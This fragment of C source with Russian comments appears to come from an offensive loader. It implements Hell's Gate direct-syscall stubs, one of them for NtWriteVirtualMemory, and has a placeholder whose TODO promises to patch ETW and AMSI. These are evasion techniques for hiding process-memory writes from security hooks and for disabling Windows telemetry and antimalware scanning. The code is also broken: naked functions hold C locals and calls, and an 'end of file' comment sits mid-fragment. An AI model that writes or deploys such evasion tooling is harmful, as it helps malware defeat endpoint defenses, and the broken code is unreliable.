        : "r"(syscallNumber)
        : "%rax", "%r10", "%rcx", "memory"
    );
}

// Функция PatchETWandAMSI (пока пустая заглушка, должна быть реализована где-то еще)
void PatchETWandAMSI(void) {
    // TODO: Реализовать патчинг ETW и AMSI
}

// ... (остальной код файла без изменений) ...
// Убедитесь, что в конце файла нет незавершенных блоков или лишних символов.
// Конец файла

__declspec(naked) NTSTATUS DirectSyscall_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten)
{
    DWORD syscallNumber = GetSyscallNumberByHashHellsGate(NtWriteVirtualMemory_HASH);
    if (syscallNumber == 0xFFFFFFFF) {
        __asm__ volatile (
            "mov $0xC0000001, %%eax\n\t" // STATUS_UNSUCCESSFUL
            "ret\n"
            : : : "eax" // Clobber eax
        );
    }

    __asm__ volatile (
        "mov %0, %%eax\n\t"      // Загрузить номер syscall в EAX
        "mov %%rcx, %%r10\n\t"   // mov r10, rcx (стандартный пролог syscall в x64)
        "syscall\n\t"            // Выполнить syscall
        "ret\n"                   // Вернуться из функции
        :                          // Output operands (none)
        : "r"(syscallNumber)       // Input operands: syscallNumber в регистр
        : "%rax", "%r10", "%rcx", "memory" // Clobbered registers + memory
    );
}
//===============================================================================================// 